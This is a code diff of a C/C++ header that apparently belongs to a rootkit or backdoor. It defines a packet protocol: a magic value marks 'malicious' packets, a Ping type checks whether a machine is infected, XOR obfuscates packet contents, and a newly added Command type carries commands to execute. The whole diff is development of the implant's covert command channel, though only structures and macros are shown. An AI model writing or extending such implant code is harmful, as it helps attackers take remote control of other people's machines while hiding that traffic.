@@ -11,20 +11,29 @@
 #include <Windows.h>
 #endif
 
+#define RCAST reinterpret_cast
+#define SCAST static_cast
+#define CCAST const_cast
+
 //
 // The magic value to look for in packets. Indicates a malicious packet.
 //
 #define PACKET_MAGIC 0xDEADBEEF
+//
+// The maximum number of bytes a packet can contain. If over this limit, the packet wont be scanned for the PACKET_MAGIC.
+//
+#define PACKET_MAX_SIZE 0x1000
 
-typedef enum _PACKET_TYPE
+typedef enum class _PACKET_TYPE
 {
-	Ping,	// Used to check if a machine/port is infected.
-	Xor,	// Used to obfuscate the contents of a packet with XOR obfuscation.
+	Ping,		// Used to check if a machine/port is infected.
+	Xor,		// Used to obfuscate the contents of a packet with XOR obfuscation.
+	Command,	// Used to execute a command.
 } PACKET_TYPE;
 
 typedef struct _BASE_PACKET
 {
-	ULONG PacketLength;	// The length of the packet.
+	ULONG PacketLength;	// The length of the packet. *Does not contain the size of the MAGIC.*
 	PACKET_TYPE Type;	// Indicates the type of packet.
 } BASE_PACKET, *PBASE_PACKET;
 
@@ -47,10 +56,13 @@ typedef struct _XOR_PACKET
 
 #define XOR_PACKET_SIZE(contentLength) ((sizeof(XOR_PACKET) - 1) + contentLength)
 
-//typedef struct _COMMAND_PACKET
-//{
-//	BASE_PACKET Base;				// Contains standard information about the packet.
-//	ULONG CommandResponseLength;	// The length of the command/response.
-//	ULONG CommandResponseXorKey;	// The XOR key used to obfuscate the command/response.
-//	CHAR CommandResponse[1];		// The XOR'd command/response to execute.
-//} COMMAND_PACKET, *PCOMMAND_PACKET;
+#pragma pack(push, 1)
+typedef struct _GENERIC_BUFFER_PACKET
+{
+	BASE_PACKET Base;				// Contains standard information about the packet.
+	ULONG BufferSize;				// The size of the generic buffer (in bytes).
+	WCHAR Buffer[1];				// The generic buffer.
+} GENERIC_BUFFER_PACKET, *PGENERIC_BUFFER_PACKET;
+#pragma pack(pop)
+
+#define GENERIC_BUFFER_PACKET_SIZE(bufferSize) ((sizeof(GENERIC_BUFFER_PACKET) - 1) + bufferSize)
